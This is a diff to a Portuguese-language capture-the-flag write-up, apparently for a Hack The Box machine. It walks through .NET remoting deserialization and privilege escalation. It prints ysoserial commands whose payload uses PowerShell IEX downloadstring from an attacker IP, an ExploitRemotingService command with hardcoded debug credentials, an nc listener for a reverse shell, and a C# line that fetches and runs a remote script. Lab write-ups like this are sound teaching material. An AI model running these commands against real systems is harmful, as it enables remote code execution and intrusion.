@@ -161,15 +161,17 @@ Após isso, devemos preparar nossa shell.
 Usaremos está [shell.ps1](https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1)
 
 Vamos usar o ysoserial para criar nosso payload:
+![Image](https://i.imgur.com/UEtxowu.png)
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 .\ysoserial.exe -f BinaryFormatter -o base64 -g TypeConfuseDelegate -c "powershell -c IEX(new-object net.webclient).downloadstring('10.10.14.136/chu.ps1')"
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
-Com o ExploitRemotingService enviaremos o nosso payload:
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-.\ExploitRemotingService.exe --user=debug --pass=SharpApplicationDebugUserPassword123! tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint raw 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
+Com o ExploitRemotingService enviaremos o nosso payload:
+![Image](https://i.imgur.com/rcn6eSy.png)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+.\ExploitRemotingService.exe --user=debug --pass=SharpApplicationDebugUserPassword123! tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint raw +PAYLOAD
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 Ao enviar o payload, devemos ativar nosso servidor python e abrir uma porta em nossa máquina para receber a conexão de nossa shell.
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -180,6 +182,7 @@ nc -vvnlp 1337
 Temos nossa shell inicial :)
 
 Para escalar nossos privilégios, vamos executar o 'winpeas.exe', portanto, devemos envia-lo primeiro, vamos gerar nosso payload no ysoserial:
+![Image](https://i.imgur.com/P7Mwi7Y.png)
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 .\ysoserial.exe -f BinaryFormatter -o base64 -g TypeConfuseDelegate -c "powershell -c IEX(new-object net.webclient).downloadstring('http://10.10.14.128/winpeas.exe')"
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -199,7 +202,7 @@ smbclient \\\\10.10.10.219\\dev -U lars
 Ao baixar o arquivo para nossa máquina, podemos abri-lo no VisualStudio:
 ![Image](https://i.imgur.com/yEePAM8.png)
 
-Vamos adicionar nossa linha no código
+Vamos adicionar nossa linha no código e depois compilar.
 ![Image](https://i.imgur.com/MBxWpho.png)
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Console.WriteLine(client.InvokePowerShell(" iex (new-object net.webclient).downloadstring('http://10.10.14.136/chu.ps1')"));
